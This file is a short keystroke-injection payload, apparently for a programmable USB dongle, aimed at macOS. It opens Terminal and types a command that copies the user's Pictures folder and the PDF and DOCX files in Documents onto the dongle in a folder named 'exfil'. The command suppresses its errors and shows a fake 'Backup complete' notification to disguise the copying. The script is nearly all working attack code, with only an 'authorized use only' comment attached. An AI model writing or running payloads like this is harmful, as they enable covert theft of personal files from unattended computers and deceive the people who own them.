REM ============================================================
REM macOS: exfil Pictures (jpg/png/heic) + Documents to the dongle
REM TWO-RUN FLOW: run 1 enables USB storage and the DEVICE REBOOTS
REM (that is normal - the USB descriptor only changes at boot). Run the
REM script a SECOND time: the enable becomes a no-op and the copy runs. Card mounts at
REM /Volumes/DISK. Copied into /Volumes/DISK/exfil.
REM AUTHORIZED USE ONLY.
REM ============================================================
USB_STORAGE enable
DELAY 3000
GUI SPACE
DELAY 600
STRING terminal
DELAY 400
ENTER
DELAY 1500
STRINGLN mkdir -p /Volumes/DISK/exfil && cp -R ~/Pictures /Volumes/DISK/exfil/ 2>/dev/null; cp ~/Documents/*.pdf ~/Documents/*.docx /Volumes/DISK/exfil/ 2>/dev/null; osascript -e 'display notification "Backup complete" with title "Backup"'
DELAY 2500
STRINGLN exit
DELAY 400
LED_BLINK 5 #FFD600
SCREEN_TEXT exfil done #FFD600
LOG mac_exfil_pictures: copy issued
REM Optional cleanup - run when done (device reboots):
REM USB_STORAGE disable
